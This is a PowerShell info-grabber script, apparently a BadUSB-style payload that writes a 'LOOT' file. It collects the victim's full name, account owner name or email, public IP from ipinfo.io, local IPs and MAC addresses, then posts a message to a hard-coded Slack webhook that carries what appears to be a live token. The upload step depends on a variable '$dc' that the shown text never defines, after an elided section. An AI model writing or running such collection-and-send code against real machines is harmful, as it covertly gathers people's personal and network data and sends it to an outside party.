$FileName = "$env:tmp/$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm).txt"
$webhookUrl = "https://hooks.slack.com/services/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"

#------------------------------------------------------------------------------------------------------------------------------------
# URL : https://tinyurl.com/grabber3

function Get-FullName {

    try {
        $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
    }
    catch {
        Write-Error "No name was detected"
        return $env:UserName
    }

    return $fullName 
}

$fullName = Get-FullName

#------------------------------------------------------------------------------------------------------------------------------------

function Get-Email {
    
    try {
        $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
        return $email
    }
    catch {
        Write-Error "An email was not found"
        return "No Email Detected"
    }        
}

$email = Get-Email

#------------------------------------------------------------------------------------------------------------------------------------

try {
    $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
}
catch {
    $computerPubIP = "Error getting Public IP"
}

$localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*", "*Wi-Fi*" -AddressFamily IPv4 | Select-Object InterfaceAlias, IPAddress, PrefixOrigin | Out-String

$MAC = Get-NetAdapter -Name "*Ethernet*", "*Wi-Fi*" | Select-Object Name, MacAddress, Status | Out-String

#------------------------------------------------------------------------------------------------------------------------------------

$output = @"
Full Name: $fullName

Email: $email

------------------------------------------------------------------------------------------------------------------------------
Public IP: 
$computerPubIP

Local IPs:
$localIP

MAC:
$MAC
"@

$output > $FileName

#------------------------------------------------------------------------------------------------------------------------------------

function Send-SlackMessage {
    param (
        [Parameter(Mandatory = $true)]
        [string]$Message
    )

    $payload = @{
        "text" = $Message
    } | ConvertTo-Json

    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
    } catch {
        Write-Error "Failed to send Slack message: $_"
    }
}

# ...

if (-not ([string]::IsNullOrEmpty($dc))) {
    Send-SlackMessage -Message "File Upload: $FileName"
}
